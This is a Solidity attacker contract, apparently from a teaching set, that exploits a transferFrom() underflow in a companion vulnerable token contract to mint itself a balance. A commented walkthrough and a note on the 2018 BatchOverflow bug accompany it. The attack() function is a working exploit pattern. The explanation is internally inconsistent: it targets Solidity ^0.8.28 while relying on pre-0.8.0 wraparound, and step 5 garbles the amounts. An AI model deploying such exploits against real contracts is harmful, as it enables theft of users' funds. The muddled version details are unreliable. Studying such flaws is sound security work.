// SPDX-License-Identifier: MIT
// Vulnerability: IntegerOverflow
// File: ATTACKER contract — proves the exploit works
// ══════════════════════════════════════════════════
pragma solidity ^0.8.28;

import "./VulnerableIntegerOverflow.sol";

// ─────────────────────────────────────────────────────────────────────────────
// ATTACK WALKTHROUGH
//
// The transferFrom() function subtracts from `from`'s balance without
// checking that `from` has enough balance. When `from` is an address
// that has never deposited, their balance is 0.
//
// 0 - 1 under pre-0.8.0 Solidity (no SafeMath) = 2^256 - 1
//
// Attack steps:
//   1. Attacker deposits 0 (or a tiny amount — not needed for transferFrom path)
//   2. Attacker calls transferFrom(emptyAddress, attacker, 1)
//   3. balances[emptyAddress] wraps to 2^256 - 1 (irrelevant — a zero account)
//   4. balances[attacker] += 1 (attacker now has a real balance from nothing)
//   5. Attacker calls transfer(attacker, fullVaultBalance) — they have enough
//      because their balance is now 1 and the vault holds 1 wei = they can move it
//
// The real-world version of this was the BatchOverflow bug (April 2018)
// that affected BeautyChain (BEC) and other ERC20 tokens.
// An attacker passed a large `value` into batchTransfer() so that
// value * recipients.length overflowed to 0, bypassing the balance check,
// and each recipient received `value` tokens minted from nothing.
// ─────────────────────────────────────────────────────────────────────────────

/// @title AttackerIntegerOverflow
/// @notice Exploits the transferFrom underflow in VulnerableIntegerOverflow
contract AttackerIntegerOverflow {

    VulnerableIntegerOverflow public target;
    address public owner;

    constructor(address _target) {
        target = VulnerableIntegerOverflow(payable(_target));
        owner  = msg.sender;
    }

    /// @notice Launch the underflow attack
    /// @dev We use a throwaway address as `from`. Its balance wraps to 2^256-1.
    ///      Our own balance gets credited the steal amount from nothing.
    function attack(address emptyVictim, uint256 stealAmount) external {
        require(msg.sender == owner, "not owner");

        // step 1 — call transferFrom with an address that has 0 balance
        // balances[emptyVictim] = 0 - stealAmount → wraps to 2^256 - 1
        // balances[address(this)] += stealAmount
        target.transferFrom(emptyVictim, address(this), stealAmount);
    }

    /// @notice Show our balance after the attack
    function stolenBalance() external view returns (uint256) {
        return target.balances(address(this));
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}

}
